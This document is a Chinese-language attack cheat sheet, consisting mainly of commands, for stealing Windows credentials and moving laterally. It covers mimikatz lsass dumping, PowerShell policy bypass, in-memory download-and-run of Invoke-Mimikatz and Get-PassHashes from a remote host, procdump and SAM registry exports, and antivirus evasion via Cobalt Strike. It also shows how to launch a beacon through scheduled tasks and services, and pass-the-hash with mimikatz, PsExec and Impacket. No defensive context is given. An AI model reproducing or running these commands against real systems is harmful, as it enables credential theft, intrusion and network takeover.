获取密码hash

获取明文密码

  • 系统版本小于windows 8 & windows server 2012才能读明文密码

  • windows 8 & windows server 2012及以上需要修改注册表，开启存储明文密码功能，并重新登录系统，才能读取到明文密码。

mimikatz

使用mimikatz.exe在lsass.exe进程中读取明文密码

上传mimikatz到目标服务器

当前目录执行：

mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

正常执行后显示

Powershell版mimikatz.ps1

本地执行：

powershell Get-ExecutionPolicy //查看状态是否允许运行脚本

powershell Set-ExecutionPolicy Unrestricted //设置为允许所有的脚本运行

powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"' //获取密码

本地执行(绕过执行权限限制)

powershell -exec bypass "Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command 'privilege::debug" "sekurlsa::logonPasswords'"

远程执行

开启目标机能访问到的web服务

例如：php -S 0.0.0.0:6666

powershell.exe iex (New-Object Net.webclient).DownloadString('http://192.168.21.93:6666/Invoke-Mimikatz.ps1'); Invoke-Mimikatz

使用procdump.exe 保存lsass.exe内存数据

上传procdump.exe到目标服务器

procdump.exe -accepteula -ma lsass.exe lsass.dmp

将dmp文件下载到本地使用mimikatz读取明文密码

mimikatz默认不免杀，cs上线后可以使用cs自带的免杀mimikatz

cs中执行：logonpasswords

获取密码hash

注册表导出sam文件

reg save hklm\sam sam.bak

reg save hklm\system system.bak

reg save hklm\security security.bak

将导出的三个文件保存到本地，使用mimikatz读取hash

mimikatz.exe "lsadump::sam /sam:sam.bak /system:system.bak" "exit"

注册表导出sam文件到本地可以免杀

Get-PassHashes.ps1读取hash

本地读取

powershell -exec bypass "Import-Module .\Get-PassHashes.ps1;Get-PassHashes"

远程读取

powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.21.93:6666/Get-PassHashes.ps1');Get-PassHashes"

使用cs中 hashdump 可以免杀

明文传递

使用windows自带net use命令

net use \\192.168.21.224\ipc$ 123.com /user:administrator

复制文件到目标服务器

查看目标服务器时间

net time \\192.168.21.224

使用计划任务执行cs.exe

at \\192.168.21.224 20:31 c:\cs.exe

高版本windows中schtasks替换at

创建计划任务

schtasks /s 192.168.21.224 /create /sc once /f /tn note /TR c:\windows\cs.exe /st 20:35:00

查看计划任务

schtasks /s 192.168.21.224 /query /tn note

删除计划任务

schtasks /s 192.168.21.224 /delete /tn note /f

使用sc命令创建服务启动cs.exe

sc \\192.168.21.224 create shell binpath= c:\cs.exe start= auto

启动服务

sc \\192.168.21.224 start shell

cs正常上线

Hash传递

使用mimikatz.exe通过密码hash创建连接

mimikatz.exe "sekurlsa::pth /domain:192.168.21.224 /user:administrator /ntlm:afffeba176210fad4628f0524bfe1942" "exit"

弹出cmd窗口

微软pstools

已建立连接net use \\192.168.21.224\ipc$ 123.com /user:administrator

直接执行命令

PsExec64 -accepteula \\192.168.21.224 whoami

未创建连接

PsExec -accepteula \\192.168.21.224 -u administrator -p 123.com -s cmd

返回cmd

Impacket

支持hash传递

psexec -hashes 00000000000000000000000000000000:afffeba176210fad4628f0524bfe1942 administrator@192.168.21.224 cmd

返回cmd
